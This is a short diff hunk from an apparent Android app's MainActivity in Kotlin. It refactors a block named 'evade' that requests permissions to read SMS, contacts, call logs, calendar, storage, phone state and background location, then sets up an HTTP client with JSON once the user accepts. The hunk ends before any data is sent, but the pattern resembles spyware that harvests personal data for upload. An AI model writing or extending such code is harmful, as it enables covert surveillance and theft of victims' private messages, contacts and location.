@@ -67,11 +67,12 @@ class MainActivity : AppCompatActivity() {
             }
         }
         evade {
-            val kotlinPermissions = KotlinPermissions.with(this)
-            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
-                kotlinPermissions.permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.READ_PHONE_STATE)
-            else
-                kotlinPermissions.permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_COARSE_LOCATION)
+            val kotlinPermissions = KotlinPermissions.with(this).apply {
+                if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+                    permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.READ_PHONE_STATE)
+                else
+                    permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_COARSE_LOCATION)
+            }
             kotlinPermissions.onAccepted {
                 HttpClient(CIO){
                     install(JsonFeature){
